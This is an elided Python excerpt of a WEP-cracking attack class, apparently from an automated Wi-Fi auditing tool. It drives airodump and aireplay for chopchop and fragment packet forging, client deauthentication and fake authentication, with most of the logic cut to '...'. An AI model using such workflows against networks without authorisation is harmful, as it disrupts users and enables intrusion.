...
class AttackWEP(Attack):
            ...
            try:
                ...
                with Airodump(
                    ...
                    while True:
                        ...
                        if (
                            client_mac is None
                            and len(airodump_target.clients) > 0
                        ):
                            client_mac = airodump_target.clients[0].station
                        ...
                        if not aireplay.is_running():
                            ...
                            if (
                                attack_name == "chopchop"
                                or attack_name == "fragment"
                            ):
                                ...
                                if not xor_file:
                                    ...
                                    Color.pl(
                                        "\n{!} {O}%s attack{R} did not generate a .xor file"
                                        % attack_name
                                    )
                                    # XXX: For debugging
                                    Color.pl(
                                ...
                                if replay_file:
                                    ...
                                    time_unchanged_ivs = (
                                        time.time()
                                    )  # Reset unchanged IVs time (it may have taken a while to forge the packet)
                                    continue
                                else:
                        ...
                        if airodump_target.ivs > last_ivs_count:
                            ...
                            and attack_name != "chopchop"
                            and attack_name != "fragment"
                        ):
                ...
                if self.user_wants_to_stop(
                    attack_name, attacks_remaining, airodump_target
                ):
                    if keep_ivs:
                        Airodump.delete_airodump_temp_files("wep")
    ...
    def user_wants_to_stop(self, current_attack, attacks_remaining, target):
        ...
        if answer == 1:
            ...
            for client in target.clients:
                ...
                Color.clear_entire_line()
                Color.p(
                    "\r{+} {O}Deauthenticating client {C}%s{W}..."
                    % client.station
                )
    ...
    def fake_auth(self):
        ...
        """
        Color.p(
            "\r{+} attempting {G}fake-authentication{W} with {C}%s{W}..."
            % self.target.bssid
        )
        fakeauth = Aireplay.fakeauth(
            self.target, timeout=AttackWEP.fakeauth_wait
        )
        if fakeauth:
